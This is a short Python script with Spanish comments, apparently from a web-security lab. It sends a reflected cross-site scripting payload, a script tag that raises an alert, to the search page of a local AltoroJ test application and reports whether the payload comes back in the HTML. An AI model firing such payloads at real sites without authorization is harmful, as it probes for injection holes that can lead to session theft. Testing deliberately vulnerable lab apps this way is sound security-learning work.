import requests

import urllib.parse

# URL de la página vulnerable

url = 'http://localhost:8080/AltoroJ/search.jsp'

payload = "<script>alert('Hola, soy un script');</script>"

#payload = "hola"

encoded_payload = urllib.parse.quote(payload)


full_url = f"{url}?query={encoded_payload}"

response = requests.get(full_url)

if response.status_code == 200:

    html_content = response.text

    if payload in html_content:

        print("1, El payload fue reflejado en la respuesta HTML")

    else:

         print("0, El payload no se encontro")

else:

    print(f"Error en la petición: Código {response.status_code}")